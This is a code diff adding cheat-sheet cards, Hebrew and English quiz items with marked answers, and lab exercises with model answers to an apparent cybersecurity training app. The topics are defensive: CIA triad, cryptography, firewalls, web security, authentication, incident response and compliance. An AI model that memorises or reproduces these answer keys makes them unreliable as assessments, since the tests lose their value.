+<div class="cheat-item"><span class="cheat-key">Passkey</span><span class="cheat-val">✅ Future</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">JWT</div>
+<div class="cheat-item"><span class="cheat-key">Header</span><span class="cheat-val">alg + typ</span></div>
+<div class="cheat-item"><span class="cheat-key">Payload</span><span class="cheat-val">NOT encrypted!</span></div>
+<div class="cheat-item"><span class="cheat-key">Signature</span><span class="cheat-val">HMAC(h.p, secret)</span></div>
+<div class="cheat-item"><span class="cheat-key">alg:none attack</span><span class="cheat-val">❌ Always validate alg</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 Summary — Malware & Social Eng</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">Phishing Types</div>
+<div class="cheat-item"><span class="cheat-key">Phishing</span><span class="cheat-val">Mass emails</span></div>
+<div class="cheat-item"><span class="cheat-key">Spear</span><span class="cheat-val">Targeted at individual</span></div>
+<div class="cheat-item"><span class="cheat-key">Whaling</span><span class="cheat-val">Against C-level</span></div>
+<div class="cheat-item"><span class="cheat-key">Vishing</span><span class="cheat-val">Voice/phone</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Ransomware</div>
+<div class="cheat-item"><span class="cheat-key">Initial Access</span><span class="cheat-val">Phishing/RDP</span></div>
+<div class="cheat-item"><span class="cheat-key">Lateral Movement</span><span class="cheat-val">Spreading in network</span></div>
+<div class="cheat-item"><span class="cheat-key">Double Extortion</span><span class="cheat-val">Encrypt + steal</span></div>
+<div class="cheat-item"><span class="cheat-key">Defense #1</span><span class="cheat-val">Patch management</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 Summary — Incident Response</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">NIST IR Phases</div>
+<div class="cheat-item"><span class="cheat-key">1</span><span class="cheat-val">Preparation</span></div>
+<div class="cheat-item"><span class="cheat-key">2</span><span class="cheat-val">Detection & Analysis</span></div>
+<div class="cheat-item"><span class="cheat-key">3</span><span class="cheat-val">Containment</span></div>
+<div class="cheat-item"><span class="cheat-key">4</span><span class="cheat-val">Eradication</span></div>
+<div class="cheat-item"><span class="cheat-key">5</span><span class="cheat-val">Recovery</span></div>
+<div class="cheat-item"><span class="cheat-key">6</span><span class="cheat-val">Lessons Learned</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Order of Volatility</div>
+<div class="cheat-item"><span class="cheat-key">1st</span><span class="cheat-val">CPU registers</span></div>
+<div class="cheat-item"><span class="cheat-key">2nd</span><span class="cheat-val">Network connections</span></div>
+<div class="cheat-item"><span class="cheat-key">3rd</span><span class="cheat-val">RAM memory</span></div>
+<div class="cheat-item"><span class="cheat-key">4th</span><span class="cheat-val">Disk / Logs</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 Summary — Compliance & Risk</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">GDPR</div>
+<div class="cheat-item"><span class="cheat-key">72 hours</span><span class="cheat-val">Breach notification</span></div>
+<div class="cheat-item"><span class="cheat-key">Max fine</span><span class="cheat-val">4% turnover / €20M</span></div>
+<div class="cheat-item"><span class="cheat-key">Right to Erasure</span><span class="cheat-val">Data deletion</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Risk Strategies</div>
+<div class="cheat-item"><span class="cheat-key">Mitigate</span><span class="cheat-val">Reduce</span></div>
+<div class="cheat-item"><span class="cheat-key">Transfer</span><span class="cheat-val">Insurance</span></div>
+<div class="cheat-item"><span class="cheat-key">Accept</span><span class="cheat-val">Conscious acceptance</span></div>
+<div class="cheat-item"><span class="cheat-key">Avoid</span><span class="cheat-val">Don't do it</span></div>
+</div>
+</div>`
+  ]
+}};
+// Balanced quiz/lab/game data — normalizeOptions in engine handles length bias
+
+const QUIZZES = {
+0:[
+  {q:"מה CIA Triad מייצג?",o:["Cryptography, Integrity, Authentication","Confidentiality, Integrity, Availability","Control, Identity, Access","Cyber, Intel, Analysis"],a:1,e:"CIA = Confidentiality (סודיות), Integrity (שלמות), Availability (זמינות). שלוש עמודות כל מדיניות אבטחה."},
+  {q:"STRIDE — מה 'S' מייצג?",o:["Scanning","Spoofing — התחזות","Sniffing","Scripting"],a:1,e:"Spoofing = התחזות לזהות אחרת. דוגמה: email phishing, IP spoofing, ARP spoofing."},
+  {q:"מה Defense in Depth?",o:["firewall אחד חזק","הגנה בשכבות מרובות","הצפנה חזקה","backup תדיר"],a:1,e:"הגנה בשכבות: תוקף שעובר שכבה אחת נתקל בעוד חמש. אין הגנה מושלמת אחת."},
+  {q:"Colonial Pipeline נפגע בגלל:",o:["SQL injection","VPN ישן ללא MFA","XSS attack","zero-day exploit"],a:1,e:"VPN account ישן עם סיסמה שדלפה, ללא MFA. הגישה הראשונית הייתה פשוטה להפליא."},
+  {q:"איזו עמודת CIA מוקרבת בגיבוי מוצפן ולא מחובר?",o:["Confidentiality","Integrity","Availability","אין הקרבה"],a:2,e:"Offline backup = Availability נפגעת (לא ניתן לגשת מיידית), אבל Confidentiality ו-Integrity שמורים."}
+],
+1:[
+  {q:"איזה mode של AES מומלץ לשימוש?",o:["ECB — מהיר וישן","CBC — נפוץ ויציב","GCM — מהיר ומאומת","OFB — מיוחד לstream"],a:2,e:"AES-GCM = מהיר, מקבילי, ו-Authenticated Encryption (מגן מcorruption ומתקפות)."},
+  {q:"MD5 ו-SHA-1 אינם בטוחים כי:",o:["ארוכים מדי לחישוב","ניתן למצוא collision — שני inputs זהים","שניהם מצפינים, לא hashing","לא נתמכים בchrome"],a:1,e:"Collision resistance נשברה. ניתן ליצור שני קבצים שונים עם hash זהה — חותמות דיגיטליות לא בטוחות."},
+  {q:"לסיסמאות משתמשים יש להשתמש ב:",o:["SHA-256 עם salt","MD5 מהיר","bcrypt או Argon2","AES-256"],a:2,e:"bcrypt/Argon2 מוגדרים להיות איטיים בכוונה — מגנים מbrute force. SHA-256 מהיר מדי לסיסמאות."},
+  {q:"ב-TLS handshake, מה תפקיד ה-certificate?",o:["מצפין את הנתונים","מאמת זהות השרת ומכיל public key","מחליף סיסמאות","מגדיר compression"],a:1,e:"Certificate = מסמך חתום ע\"י CA שמאמת שה-public key שייך לדומיין הזה. MITM נחסם."},
+  {q:"ed25519 עדיף על RSA-2048 כי:",o:["ישן יותר ומוכר","קצר ומהיר, בטוח כמו RSA-3072","ארוך יותר ולכן בטוח","תומך רק ב-Linux"],a:1,e:"ed25519 = Elliptic Curve. 256bit = בטוח כ-RSA-3072. מהיר וקצר יותר."}
+],
+2:[
+  {q:"מה ההבדל בין IDS ל-IPS?",o:["IDS בחינם, IPS בתשלום","IDS מזהה ומתריע, IPS גם חוסם","IDS מהיר יותר","IDS לNetwork, IPS לHost"],a:1,e:"IDS = Intrusion Detection System (passive, alerts only). IPS = Intrusion Prevention System (inline, blocks)."},
+  {q:"Zero Trust — מה העיקרון המרכזי?",o:["firewall חזק בכניסה","לעולם אל תסמוך, תמיד אמת","VPN לכולם תמיד","סיסמאות חזקות"],a:1,e:"Zero Trust: לא סומכים על מיקום (inside/outside network). כל גישה מאומתת ומורשית בנפרד."},
+  {q:"Stateful firewall עדיף על Stateless כי:",o:["מהיר יותר תמיד","מבין context של connections","זול יותר לתפעול","לא דורש configuration"],a:1,e:"Stateful עוקב אחר TCP connections. ACK ללא SYN = חשוד. מגן מתקיפות שstateless מפספסת."},
+  {q:"מה network segmentation מונע?",o:["DDoS attacks","lateral movement אחרי פרצה","phishing emails","SQL injection"],a:1,e:"Segmentation = פרצה ב-DMZ לא מגיעה אוטומטית ל-DB. מגביל blast radius של כל תקיפה."},
+  {q:"SolarWinds נפרץ דרך:",o:["brute force attack","supply chain — update נגוע","SQL injection","social engineering"],a:1,e:"Supply chain attack: הפרצה ב-SolarWinds עצמה גרמה ל-18,000 לקוחות להתקין backdoor כ-legitimate update."}
+],
+3:[
+  {q:"כיצד מגינים מSQL Injection?",o:["whitelist פורטים","parameterized queries","firewall חזק","rate limiting"],a:1,e:"Parameterized queries = input מטופל כdata, לא כSQL code. הפתרון היחיד האמיתי ל-SQLi."},
+  {q:"Stored XSS שונה מReflected XSS כי:",o:["פחות מסוכן","מאוחסן בDB ומבוצע על כל visitor","דורש זמן אמת","רק בChrome"],a:1,e:"Stored XSS: script זדוני נשמר בDB (תגובה, פרופיל). כל visitor מקבל ומריץ אותו אוטומטית."},
+  {q:"Content Security Policy (CSP) מגנה מ:",o:["SQL injection","XSS — חוסם scripts ממקורות לא מורשים","brute force","MITM attacks"],a:1,e:"CSP header מגדיר מאיזה מקורות מותר לטעון scripts. script-src 'self' חוסם כל inline XSS."},
+  {q:"British Airways נפגעה בגלל:",o:["SQL injection","script זדוני בדף תשלום","account takeover","DDoS"],a:1,e:"Magecart שתל 22 שורות JS בדף תשלום. CSP ו-SRI היו חוסמים זאת לחלוטין."},
+  {q:"CSRF attack מנוע עם:",o:["parameterized queries","SameSite cookies ו-CSRF tokens","HTTPS בלבד","rate limiting"],a:1,e:"SameSite=Strict מונע שליחת cookies cross-site. CSRF token ייחודי לכל form מונע זיוף בקשות."}
+],
+4:[
+  {q:"SMS OTP חלש יחסית בגלל:",o:["קצר מדי","SIM swapping ו-SS7 attacks","לא נתמך בiOS","לא GDPR compliant"],a:1,e:"SIM swapping = הנדסה חברתית ל-carrier לעביר מספר. SS7 = פרוטוקול טלפוניה ישן עם חולשות."},
+  {q:"JWT Payload:",o:["מוצפן לחלוטין","מקודד base64 — קריא לכולם","סודי ומוגן","נשמר בserver"],a:1,e:"base64 ≠ הצפנה. כל אחד יכול לפענח JWT payload תוך שנייה. לעולם אל תשים secrets בpayload."},
+  {q:"OAuth 2.0 מאפשר:",o:["הצפנת passwords","גישה מוגבלת ללא שיתוף סיסמה","MFA חזק","log ניהול"],a:1,e:"OAuth = Authorization delegation. 'Login with Google' לא חושף סיסמה ל-Spotify — רק access token מוגבל."},
+  {q:"Okta הופגעה בגלל:",o:["weak passwords","support system עם גישה לprod","SQLi","phishing כללי"],a:1,e:"Support ticket system קיבל גישה רחבה מדי ל-production. Least privilege = גם לsupport tools."},
+  {q:"Principle of Least Privilege אומר:",o:["לנעול הכל","לתת מינימום הרשאות לביצוע תפקיד","לא לתת הרשאות לאף אחד","לתת הרשאות לפי בקשה"],a:1,e:"כל user, service ו-system מקבל רק את הרשאות שצריך — לא יותר. Blast radius = מינימלי."}
+],
+5:[
+  {q:"Spear phishing שונה מphishing רגיל כי:",o:["משתמש בemail","ממוקד לאדם ספציפי עם פרטים","יוצא ממספר רב של שרתים","אוטומטי לחלוטין"],a:1,e:"Spear phishing = ממוקד. כולל שם, תפקיד, אירועים אחרונים. אחוז הצלחה גבוה בהרבה."},
+  {q:"WannaCry התפשט דרך:",o:["email phishing","EternalBlue — SMBv1 exploit","brute force RDP","SQL injection"],a:1,e:"EternalBlue = NSA exploit שדלף. SMBv1 פגיעות ב-Windows. patch שוחרר 2 חודשים קודם."},
+  {q:"Double Extortion בransomware אומר:",o:["כופר כפול","הצפנה + גנבת נתונים ואיום לפרסם","שתי קבוצות תוקפות","תשלום בשתי מטבעות"],a:1,e:"גיבוי טוב מגן מהצפנה. אבל Double Extortion מאיים גם לפרסם נתונים גנובים — גיבוי לא מספיק."},
+  {q:"מה ה-Initial Access הנפוץ ביותר בransomware?",o:["zero-day exploits","phishing ו-RDP חשוף","supply chain","physical access"],a:1,e:"רוב קמפיינים מתחילים בphishing email או RDP חשוף לinternet עם סיסמה חלשה."},
+  {q:"91% מהתקפות הסייבר מתחילות ב:",o:["zero-day exploit","phishing email","brute force","SQL injection"],a:1,e:"הגורם האנושי הוא נקודת הכניסה הכי נפוצה. security awareness training = הגנה קריטית."}
+],
+6:[
+  {q:"מה Order of Volatility?",o:["סדר מחיקת עדויות","סדר שימור ראיות מהנדיפות לעמידה","חומרת האירוע","מהירות תגובה"],a:1,e:"RAM נייד יותר מDisk. תמיד לשמור: CPU registers → Network → RAM → Disk. Reboot = אובדן RAM."},
+  {q:"MTTR בתחום אבטחה:",o:["Maximum Threat Response Time","Mean Time To Respond — זמן תגובה ממוצע","Monthly Threat Rate","Minimum Threat Resolution"],a:1,e:"MTTR הממוצע = 207 ימים לזיהוי + 73 להכלה. תוקף יכול לשבת ברשת 9 חודשים."},
+  {q:"בשלב Containment של IR:",o:["מוחקים את הmalware","מבודדים מערכות נגועות מיידית","מדווחים לרגולטור","מחזירים לפעילות"],a:1,e:"Containment = isolation מיידי. לחתוך את ה-network access של מערכות נגועות לפני eradication."},
+  {q:"IOC = Indicator of Compromise. דוגמה:",o:["IP address חשוד","firewall rule","password policy","backup schedule"],a:0,e:"IOCs כוללים: IP/domain חשודים, file hashes, registry keys, scheduled tasks חריגים."},
+  {q:"Equifax לא זיהתה פרצה 76 ימים כי:",o:["אין log system","SSL inspection לא הופעל","אין firewall","אין backup"],a:1,e:"Traffic מוצפן עם expired certificate עבר ללא בדיקה. SSL inspection הכרחי לראיית outbound data."}
+],
+7:[
+  {q:"GDPR מחייב דיווח על breach תוך:",o:["24 שעות","48 שעות","72 שעות","שבוע"],a:2,e:"72 שעות לדיווח לרגולטור. אם נפגעו data subjects — גם להם. עיכוב = קנסות נוספים."},
+  {q:"קנס מקסימלי של GDPR:",o:["€1M","€10M","4% מחזור שנתי גלובלי","1% הכנסה","€100K"],a:2,e:"הגבוה מבין: €20M או 4% מהמחזור הגלובלי השנתי. Meta קיבלה €1.2B ב-2023."},
+  {q:"Risk Transfer אומר:",o:["העברת נתונים לענן","ביטוח סייבר — צד שלישי נושא בסיכון","הצפנת נתונים","שיתוף עם שותף"],a:1,e:"Cyber Insurance = העברת הסיכון הכספי לחברת ביטוח. לא מפחיתה את הסיכון הטכני."},
+  {q:"Privacy by Design אומר:",o:["הצפנה בלבד","אבטחה מובנית בתכנון — לא כ-afterthought","מחיקת נתונים","audit logs תמיד"],a:1,e:"Privacy by Design = אבטחה ופרטיות משולבות בארכיטקטורה מהיום הראשון, לא מוסיפות אחרי כן."},
+  {q:"SOC 2 Type II שונה מType I כי:",o:["תקן שונה לחלוטין","בודק על פני תקופת זמן, לא רגע אחד","זול יותר","לארגונים קטנים"],a:1,e:"Type I = snapshot ביום נתון. Type II = audit על 6-12 חודשים, מוכיח שהבקרות עובדות לאורך זמן."}
+]};
+
+const QUIZZES_EN = {
+0:[
+  {q:"What does CIA Triad stand for?",o:["Cryptography, Integrity, Authentication","Confidentiality, Integrity, Availability","Control, Identity, Access","Cyber, Intel, Analysis"],a:1,e:"CIA = Confidentiality, Integrity, Availability. Three pillars of every security policy."},
+  {q:"In STRIDE, what does 'S' stand for?",o:["Scanning","Spoofing — impersonation","Sniffing","Scripting"],a:1,e:"Spoofing = impersonating another identity. Examples: email phishing, IP spoofing, ARP spoofing."},
+  {q:"What is Defense in Depth?",o:["One strong firewall","Multiple overlapping security layers","Strong encryption only","Frequent backups"],a:1,e:"Layered defense: an attacker who passes one layer faces five more. No single perfect defense exists."},
+  {q:"Colonial Pipeline was attacked via:",o:["SQL injection","Old VPN account without MFA","XSS attack","Zero-day exploit"],a:1,e:"An old VPN account with a leaked password, no MFA. The initial access was surprisingly simple."},
+  {q:"Which CIA pillar is sacrificed by an offline encrypted backup?",o:["Confidentiality","Integrity","Availability","None are sacrificed"],a:2,e:"Offline backup = Availability suffers (can't access immediately), but Confidentiality and Integrity are preserved."}
+],
+1:[
+  {q:"Which AES mode is recommended for use?",o:["ECB — fast and old","CBC — common and stable","GCM — fast and authenticated","OFB — special for streams"],a:2,e:"AES-GCM = fast, parallelizable, and Authenticated Encryption (protects from corruption and attacks)."},
+  {q:"MD5 and SHA-1 are insecure because:",o:["Too slow to compute","Collision attacks are possible","They encrypt rather than hash","Not supported in Chrome"],a:1,e:"Collision resistance is broken. Two different files can have the same hash — digital signatures are unsafe."},
+  {q:"For user passwords you should use:",o:["SHA-256 with salt","Fast MD5","bcrypt or Argon2","AES-256"],a:2,e:"bcrypt/Argon2 are intentionally slow — protecting against brute force. SHA-256 is too fast for passwords."},
+  {q:"In TLS handshake, the certificate's role is:",o:["Encrypts the data","Authenticates server and contains public key","Replaces passwords","Sets compression"],a:1,e:"Certificate = CA-signed document proving the public key belongs to this domain. MITM is blocked."},
+  {q:"ed25519 is better than RSA-2048 because:",o:["It's older and more recognized","Short and fast, as secure as RSA-3072","Longer so more secure","Only works on Linux"],a:1,e:"ed25519 = Elliptic Curve. 256bit = as secure as RSA-3072. Faster and shorter keys."}
+],
+2:[
+  {q:"Difference between IDS and IPS?",o:["IDS is free, IPS costs money","IDS detects and alerts, IPS also blocks","IDS is faster","IDS for network, IPS for host"],a:1,e:"IDS = passive, alerts only. IPS = inline, actively blocks malicious traffic."},
+  {q:"Zero Trust's core principle:",o:["Strong perimeter firewall","Never trust, always verify","VPN for everyone","Strong passwords"],a:1,e:"Zero Trust: don't trust location (inside/outside network). Every access is authenticated and authorized separately."},
+  {q:"Stateful firewall is better than stateless because:",o:["Always faster","Understands connection context","Cheaper to operate","No configuration needed"],a:1,e:"Stateful tracks TCP connections. ACK without SYN = suspicious. Catches attacks stateless firewalls miss."},
+  {q:"Network segmentation prevents:",o:["DDoS attacks","Lateral movement after a breach","Phishing emails","SQL injection"],a:1,e:"Segmentation = a breach in the DMZ doesn't automatically reach the DB. Limits blast radius."},
+  {q:"SolarWinds was breached via:",o:["Brute force attack","Supply chain — infected update","SQL injection","Social engineering"],a:1,e:"Supply chain attack: the breach at SolarWinds caused 18,000 customers to install a backdoor as a legitimate update."}
+],
+3:[
+  {q:"How do you protect against SQL Injection?",o:["Whitelist ports","Parameterized queries","Strong firewall","Rate limiting"],a:1,e:"Parameterized queries = input treated as data, not SQL code. The only real solution to SQLi."},
+  {q:"Stored XSS differs from Reflected XSS because:",o:["Less dangerous","Stored in DB and executes on every visitor","Requires real-time interaction","Only in Chrome"],a:1,e:"Stored XSS: malicious script saved in DB (comment, profile). Every visitor automatically receives and executes it."},
+  {q:"Content Security Policy (CSP) protects against:",o:["SQL injection","XSS — blocks scripts from unauthorized sources","Brute force","MITM attacks"],a:1,e:"CSP header defines which sources scripts can load from. script-src 'self' blocks all inline XSS."},
+  {q:"British Airways was breached via:",o:["SQL injection","Malicious script on payment page","Account takeover","DDoS"],a:1,e:"Magecart planted 22 lines of JS on the payment page. CSP and SRI would have blocked this entirely."},
+  {q:"CSRF attacks are prevented with:",o:["Parameterized queries","SameSite cookies and CSRF tokens","HTTPS only","Rate limiting"],a:1,e:"SameSite=Strict prevents cross-site cookie sending. Unique CSRF token per form prevents request forgery."}
+],
+4:[
+  {q:"SMS OTP is relatively weak because of:",o:["Too short","SIM swapping and SS7 attacks","Not supported on iOS","Not GDPR compliant"],a:1,e:"SIM swapping = social engineering a carrier to transfer a number. SS7 = old telephony protocol with vulnerabilities."},
+  {q:"JWT Payload is:",o:["Fully encrypted","Base64 encoded — readable by anyone","Secret and protected","Stored on the server"],a:1,e:"base64 ≠ encryption. Anyone can decode a JWT payload in a second. Never put secrets in the payload."},
+  {q:"OAuth 2.0 enables:",o:["Password encryption","Limited access without sharing passwords","Strong MFA","Log management"],a:1,e:"OAuth = Authorization delegation. 'Login with Google' doesn't expose your password to Spotify — just a limited access token."},
+  {q:"Okta was breached because:",o:["Weak passwords","Support system with production access","SQLi","Generic phishing"],a:1,e:"Support ticket system had overly broad access to production. Least privilege applies to support tools too."},
+  {q:"Principle of Least Privilege means:",o:["Lock everything down","Give minimum permissions to do the job","Give no permissions to anyone","Give permissions on request"],a:1,e:"Every user, service and system gets only the permissions they need — no more. Blast radius = minimal."}
+],
+5:[
+  {q:"Spear phishing differs from regular phishing because:",o:["Uses email","Targeted at a specific person with personal details","Comes from many servers","Fully automated"],a:1,e:"Spear phishing = targeted. Includes name, role, recent events. Much higher success rate."},
+  {q:"WannaCry spread via:",o:["Email phishing","EternalBlue — SMBv1 exploit","Brute force RDP","SQL injection"],a:1,e:"EternalBlue = leaked NSA exploit. SMBv1 vulnerability in Windows. Patch released 2 months earlier."},
+  {q:"Double Extortion in ransomware means:",o:["Double ransom","Encryption + data theft with threat to publish","Two groups attack","Payment in two currencies"],a:1,e:"A good backup protects from encryption. But Double Extortion also threatens to publish stolen data — backup isn't enough."},
+  {q:"Most common Initial Access in ransomware:",o:["Zero-day exploits","Phishing and exposed RDP","Supply chain","Physical access"],a:1,e:"Most campaigns start with a phishing email or internet-exposed RDP with a weak password."},
+  {q:"91% of cyber attacks start with:",o:["Zero-day exploit","Phishing email","Brute force","SQL injection"],a:1,e:"The human factor is the most common entry point. Security awareness training = critical defense."}
+],
+6:[
+  {q:"What is Order of Volatility?",o:["Order of deleting evidence","Order of preserving evidence from volatile to stable","Incident severity","Response speed"],a:1,e:"RAM is more volatile than Disk. Always preserve: CPU registers → Network → RAM → Disk. Reboot = RAM loss."},
+  {q:"MTTR in security means:",o:["Maximum Threat Response Time","Mean Time To Respond — average response time","Monthly Threat Rate","Minimum Threat Resolution"],a:1,e:"Average MTTR = 207 days to detect + 73 to contain. An attacker can sit in your network 9 months."},
+  {q:"In the Containment phase of IR:",o:["Delete the malware","Isolate infected systems immediately","Report to regulator","Restore to operations"],a:1,e:"Containment = immediate isolation. Cut network access of infected systems before eradication."},
+  {q:"An IOC example is:",o:["Suspicious IP address","Firewall rule","Password policy","Backup schedule"],a:0,e:"IOCs include: suspicious IP/domains, file hashes, registry keys, unusual scheduled tasks."},
+  {q:"Equifax didn't detect the breach for 76 days because:",o:["No log system","SSL inspection was disabled","No firewall","No backup"],a:1,e:"Encrypted traffic with an expired certificate passed uninspected. SSL inspection is essential to see outbound data."}
+],
+7:[
+  {q:"GDPR requires breach notification within:",o:["24 hours","48 hours","72 hours","One week"],a:2,e:"72 hours to notify the regulator. If data subjects are affected — notify them too. Delay = additional fines."},
+  {q:"GDPR maximum fine:",o:["€1M","€10M","4% of global annual turnover","1% revenue"],a:2,e:"Whichever is higher: €20M or 4% of global annual turnover. Meta received €1.2B in 2023."},
+  {q:"Risk Transfer means:",o:["Moving data to cloud","Cyber insurance — third party bears the risk","Data encryption","Sharing with a partner"],a:1,e:"Cyber Insurance = transferring financial risk to an insurer. Doesn't reduce the technical risk."},
+  {q:"Privacy by Design means:",o:["Encryption only","Security built into design — not as afterthought","Data deletion","Audit logs always"],a:1,e:"Privacy by Design = security and privacy embedded in architecture from day one, not added afterward."},
+  {q:"SOC 2 Type II differs from Type I because:",o:["Completely different standard","Tests over a time period, not a single moment","Less expensive","For small organizations"],a:1,e:"Type I = snapshot on one day. Type II = audit over 6-12 months, proving controls work consistently."}
+]};
+
+const LABS = {
+0:[
+  {q:"ארגון מאחסן נתוני בריאות של 5M לקוחות. זהי שלוש איומי STRIDE הרלוונטיים ביותר.",a:"1. Information Disclosure — דליפת רשומות רפואיות (CIA: Confidentiality)\n2. Tampering — שינוי תוצאות בדיקות (CIA: Integrity)\n3. DoS — הורדת מערכת בית חולים (CIA: Availability)\n\nSTRIDE שנשאר: Spoofing (רלוונטי), Repudiation (audit logs חשובים), Elevation of Privilege (DB admin access)."},
+  {q:"הגדרי את סדר עדיפות CIA עבור: (א) בנק מרכזי, (ב) פלטפורמת streaming, (ג) מערכת 911.",a:"(א) בנק: Integrity > Confidentiality > Availability\nשינוי יתרה = קטסטרופה. סודיות = חשובה. downtime = קשה אבל סביר.\n\n(ב) Streaming: Availability > Confidentiality > Integrity\nNetflix down = הפסד כסף. תוכן לא סודי במיוחד.\n\n(ג) 911: Availability = Integrity > Confidentiality\nמערכת שלא עובדת = מוות. נתונים שגויים = מוות. פרטיות = חשובה אבל משנית."},
+  {q:"מה צריך לשנות בארכיטקטורה: DB פרודקשן מחובר ישירות לinternet, מריץ FTP על port 21.",a:"שינויים נדרשים:\n1. לנתק DB מinternet לחלוטין — DB לא אמור לקבל connections ישירות מexterior\n2. הוסף DMZ layer: Internet → WAF → App Server → DB (subnet נפרד)\n3. כבה FTP לחלוטין — unencrypted, ניחוש credentials קל\n4. אם צריך file transfer: SFTP על port 22 דרך bastion host\n5. Security Groups/ACL: DB מקבל connections רק מApp Server, לא מshared subnet"},
+  {q:"הגדרי Threat Model לAPI שמאפשר login. מה האיומים ומה ההגנות?",a:"STRIDE על /api/login:\n\nSpoofing: Credential stuffing, Brute force\n→ Rate limiting, MFA, CAPTCHA, account lockout\n\nTampering: שינוי request (user→admin)\n→ Server-side validation, לא לסמוך על client data\n\nInformation Disclosure: Error messages מפורטים מדי\n→ Generic errors, לא לחשוף 'user not found' vs 'wrong password'\n\nDoS: API flooding\n→ Rate limit per IP/user, CDN, WAF\n\nElevation of Privilege: SQL injection לSQL query\n→ Parameterized queries, ORM"}
+],
+1:[
+  {q:"הסבירי למנהל לא-טכני מדוע 'Password123' = bad ו-bcrypt עדיף על SHA-256 לסיסמאות.",a:"לMנהל:\n'Password123' — מחשב מנסה מיליארד סיסמאות בשנייה. 'Password123' נמצאת בכל dictionary. נפרצת תוך שניה.\n\nלמה bcrypt עדיף על SHA-256:\nSHA-256 = מיידי. nvidia RTX 4090 מנסה 8 מיליארד SHA-256 הashes בשנייה.\nbcrypt = מכוון להיות איטי. אותו GPU: 100K bcrypt בשנייה.\n'Password123' ב-bcrypt: ~10 שניות לפרוץ במקום מיידי.\n\nביחד: סיסמה חזקה + bcrypt + salting = שנים לפרוץ במקום שניות."},
+  {q:"ניתן hash SHA-256 של קובץ: abc123def. הקובץ ירד מהinternet. כיצד מאמתים שלמות?",a:"אימות שלמות:\n# הורד את הקובץ\nwget https://example.com/software.tar.gz\n\n# חשב hash של הקובץ שהורדת\nsha256sum software.tar.gz\n\n# השווה ל-hash הרשמי שפורסם\necho 'abc123def  software.tar.gz' | sha256sum -c\n# OUTPUT: software.tar.gz: OK\n\nאם חשוד שהאתר נפרץ — בדוק Hash מגיבוי/מקור אחר.\nלעולם אל תסמוך על Hash מאותו שרת שממנו הורדת!"},
+  {q:"מה ההבדל בין הצפנה סימטרית לasymmetric ומתי משתמשים בכל אחת?",a:"סימטרית (AES):\n✅ מהירה מאוד — מעשי לGB של נתונים\n✅ חומרה ייעודית (AES-NI instructions)\n❌ בעיית הפצת מפתחות — איך מחליפים מפתח בבטחה?\n\nAsymmetric (RSA, ECC):\n✅ אין בעיית הפצה — public key פתוח\n❌ איטית בהרבה — מעשי רק לכמות קטנה של נתונים\n\nבפועל: HYBRID!\nTLS Handshake:\n1. Asymmetric → מחליף session key בבטחה\n2. Symmetric (AES) → מצפין את כל הנתונים בflight\nזה מה שקורה בכל HTTPS request שאת עושה."}
+],
+2:[
+  {q:"כתבי iptables rules שמגנות על web server: HTTP/HTTPS מכולם, SSH רק מIP ספציפי.",a:"#!/bin/bash\n# Flush existing rules\niptables -F\n\n# Default: drop everything\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT\n\n# Allow loopback\niptables -A INPUT -i lo -j ACCEPT\n\n# Allow established connections\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# HTTP and HTTPS from anywhere\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\n\n# SSH ONLY from specific IP\niptables -A INPUT -p tcp --dport 22 -s 10.0.0.5 -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -j DROP\n\n# Save\niptables-save > /etc/iptables/rules.v4"},
+  {q:"תנתחי log הבא ותגידי אם יש חשד לפעולה זדונית:\n192.168.1.100 [01/Jan] GET /login 200\n192.168.1.100 [01/Jan] GET /login 200\n192.168.1.100 [01/Jan] POST /login 401\n(×500 שורות דומות)\n192.168.1.100 [01/Jan] POST /login 200",a:"ניתוח:\n🚨 Credential Stuffing / Brute Force Attack\n\nראיות:\n1. אותו IP (192.168.1.100) — 500+ ניסיונות\n2. POST /login × 500 = ניסיונות login\n3. כולם 401 (Unauthorized) עד בסוף 200 (Success)\n4. Pattern רציף = אוטומטי, לא אנושי\n\nתגובה מיידית:\n1. Block IP 192.168.1.100\n2. Lock account שנכנס (ייתכן compromised)\n3. בדוק מה עשה ה-account אחרי ה-200\n4. הפעל MFA אם לא פעיל\n5. Alert security team\n\nמניעה: Rate limiting (5 ניסיונות/דקה), CAPTCHA, fail2ban"},
+  {q:"מה Zero Trust Policy תיראה כמו עבור remote worker שמתחברת לsensitive data?",a:"Zero Trust Policy — Remote Worker:\n\n1. Identity Verification:\n   - MFA חובה (Hardware key מומלץ)\n   - Single Sign-On עם audit logging\n   - Conditional Access: אם מ-IP חדש → MFA נוסף\n\n2. Device Check:\n   - MDM/Endpoint management\n   - Device health check: OS updated, AV active, disk encrypted\n   - Corporate device only לsensitive resources\n\n3. Network:\n   - VPN עם split tunneling מינימלי\n   - או ZTNA (Zero Trust Network Access) — גישה ל-app ספציפי, לא לרשת\n\n4. Access Control:\n   - Just-in-time access (JIT) לsensitive resources\n   - Session recording על DB access\n   - Auto-timeout אחרי 15 דקות\n\n5. Monitoring:\n   - DLP — alert על העתקת נתונים גדולה\n   - UEBA — זיהוי behavior חריג"}
+],
+3:[
